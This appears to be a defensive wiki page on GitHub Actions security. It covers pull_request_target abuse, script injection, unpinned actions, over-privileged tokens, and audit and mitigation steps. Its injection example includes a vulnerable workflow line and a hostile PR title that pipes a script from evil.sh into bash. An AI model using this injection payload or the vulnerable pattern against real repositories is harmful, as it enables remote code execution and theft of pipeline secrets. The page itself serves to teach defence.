# GitHub Actions Security

GitHub Actions is the most common CI/CD system, so it is a common target. Workflows run on triggers (push, PR, issues), hold repository and deployment secrets, and can be influenced by outside contributors. A misconfigured workflow can leak secrets or let an attacker run code in your pipeline - the practical, GitHub-specific side of [CI/CD Security](CI-CD%20Security.md).

## Key risks

- **`pull_request_target` abuse** - this trigger runs the workflow **with repository secrets** but in the context of an untrusted PR. If it checks out and runs the PR's code, an external attacker gets your secrets. This is the single most dangerous Actions misconfig.
- **Script injection via untrusted input** - interpolating `${{ github.event.* }}` (PR title, branch name, issue body) directly into a `run:` step. An attacker crafts a branch/title containing shell to execute in the runner.
- **Unpinned third-party actions** - using `actions/thing@v3` or `@main` instead of a commit SHA; the action can be updated to a malicious version (supply-chain).
- **Over-privileged `GITHUB_TOKEN`** - default write permissions let a compromised step push code or releases.
- **Self-hosted runner compromise** - PRs running on persistent self-hosted runners can poison the host for later jobs.
- **Secrets in logs/artifacts** - secrets echoed or written to artifacts.

## Example: script injection

```yaml
# VULNERABLE - PR title goes straight into the shell
- run: echo "Building ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl evil.sh | bash #` runs attacker commands.

```yaml
# SAFER - pass through an environment variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building $TITLE"
```

## How to test / audit

1. Grep workflows for `pull_request_target` combined with `actions/checkout` of the PR head.
2. Look for `${{ github.event.* }}` used inside `run:` blocks (injection).
3. Check for actions pinned to tags/branches instead of SHAs.
4. Review `permissions:` - is `GITHUB_TOKEN` more than `read`?
5. Check for self-hosted runners handling fork PRs.

## Mitigation

- Avoid `pull_request_target` with untrusted checkout; prefer `pull_request` (no secrets) for fork PRs.
- Never interpolate untrusted input into `run:`; pass via `env:` and quote.
- **Pin actions by full commit SHA**; use Dependabot to update them deliberately.
- Set minimal `permissions:` (default to `read`), scope secrets to environments with approvals.
- Use OIDC for cloud auth instead of long-lived keys; require approval for deploys.

## Related

- [CI/CD Security](CI-CD%20Security.md), [Dependency Confusion](Dependency%20Confusion.md)

## Resources

- [GitHub Actions security hardening docs](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
